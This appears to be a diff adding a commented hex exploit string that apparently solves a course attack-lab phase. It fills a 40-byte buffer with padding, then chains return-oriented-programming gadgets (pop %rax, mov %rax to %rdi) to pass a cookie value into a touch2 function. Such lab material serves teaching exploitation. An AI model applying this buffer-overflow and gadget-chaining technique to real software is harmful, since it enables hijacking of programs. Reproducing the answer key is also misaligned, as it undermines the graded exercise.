@@ -1,0 +1,10 @@
+30 30 30 30 30 30 30 30 /* eight dumpy chars */
+30 30 30 30 30 30 30 30 
+30 30 30 30 30 30 30 30 
+30 30 30 30 30 30 30 30 
+30 30 30 30 30 30 30 30 /* buffer size is 0x28=40 */
+
+ab 19 40 00 00 00 00 00 /* jump to addval_219, 58:popq %rax, 90:nop */
+fa 97 b9 59 00 00 00 00 /* addr of cookie */
+a2 19 40 00 00 00 00 00 /* jump to addval_273, 48 89 c7:movq %rax,%rdi, c3:ret */
+ec 17 40 00 00 00 00 00 /* addr of function touch2 */
